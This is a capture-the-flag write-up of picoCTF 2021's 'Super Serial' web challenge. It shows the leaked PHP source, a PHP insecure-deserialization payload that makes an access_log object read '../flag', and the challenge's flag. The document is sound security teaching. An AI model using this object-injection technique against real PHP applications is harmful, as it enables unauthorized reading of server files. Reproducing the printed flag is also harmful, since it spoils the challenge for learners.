# Super Serial
- [Challenge information](#challenge-information)
- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)
## Challenge information
```text
Tags: Web Explotation, picoCTF2021

Description:  
Try to recover the flag stored on this website (http://mercury.picoctf.net:2148/)

Hints: 
1. The flag is at ../flag  
```
## Overview
![alt text](/picoCTF/Static/Images/Super_serial/image.png)
## Solution
**Step1:** Recon  
We don't know anything about login information, I tried to log in with a random account and it obviously refused.  
After looking at the source, I don't see anything special  
Try accessing `/robots.txt`  

![alt text](/picoCTF/Static/Images/Super_serial/image2.png)  
* I see there is an endpoint that I cannot access, it uses the `phps` extension  

I tried accessing `/index.phps` instead of `/index.php`  
And it provides us with a html snippet and a php snippet  
```PHP
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```
* Here we can see how the website handles cookie content  
* In short, the web will initially check to see what role we have successfully logged in with, creating a cookie from the `$perm_res` object using the process : serialize()->base64encode()->urlencode()  
* The code also provides us with an endpoint `/authentication.php`, let's try accessing it  

![alt text](/picoCTF/Static/Images/Super_serial/image3.png)  
* Visit `/authentication.phps` to view the source  
```PHP
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```
* The code shows us that the web has initialized an access_log class, which can provide us with a place to exploit POP by passing the file path into `$log_file`  
* Remember: we have complete control over the object that is `unserialized` from the cookie.  
* At this point we can vaguely guess how to exploit it, let's look at the final endpoint `/cookie.phps`  
```PHP
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```
* This is the line of code that confirms our guess  
`$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));`  
    * What it does?: It retrieves the "login" cookie from the user's browser.  
    * Who does it trust?: It blindly believes that this cookie content is a secure permissions object created by itself.  

**Step2:** Exploit  
Use burpsuite to catch requests  
First, grasp the mining mindset  
We will try to create a login cookie and pass parameters to it as in the example below  

![alt text](/picoCTF/Static/Images/Super_serial/image4.png)
* The website reported a Deserialization error, after the error is what we will continue to exploit  
* I followed the website's cookie creation logic to try creating a php code  
```php
<?php
print(urlencode(base64_encode(serialize("hello"))));
?>
```  
* Take the results and put them in cookies  

![alt text](/picoCTF/Static/Images/Super_serial/image5.png)  
* It can be seen that the web actually printed an error similar to the one we passed in  

* From the hint, we know the flag is hidden at `../flag`  
* Now let's create a payload to exploit based on the access_log class  
```PHP
<?php
class access_log
{
	public $log_file="../flag";
}
print(urlencode(base64_encode(serialize(new access_log()))));
?>
```
![alt text](/picoCTF/Static/Images/Super_serial/image6.png)  
This article tells us more about the Insecure Deserialization vulnerability, through which we should draw some experience that  
* NEVER unserialize() data from users  
* Cookies are used for "Identification", not for "Storage"  
## Flag
`picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c}`